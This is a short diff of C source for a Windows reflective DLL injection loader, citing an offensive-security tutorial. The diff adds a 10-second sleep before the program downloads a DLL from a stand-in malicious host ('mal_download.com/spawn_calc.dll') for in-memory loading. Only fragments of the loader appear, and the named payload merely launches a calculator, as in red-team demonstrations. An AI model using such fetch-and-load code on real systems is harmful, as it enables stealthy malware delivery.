@@ -1,8 +1,9 @@
 // https://www.ired.team/offensive-security/code-injection-process-injection/reflective-dll-injection
-#include <Windows.h>
+#include <windows.h>
 #include <string.h>
 #include "stdio.h"
 #include <winsock2.h>
+
 
 typedef struct BASE_RELOCATION_BLOCK {
     DWORD PageAddress;
@@ -226,6 +227,9 @@ char* DownloadToBuffer(char * webpage )
  
 int main()
 {
+    //sleep for 10 seconds
+    Sleep(10000);
+
     char* dllBytes = NULL;
 
     dllBytes = DownloadToBuffer("http://mal_download.com/spawn_calc.dll");
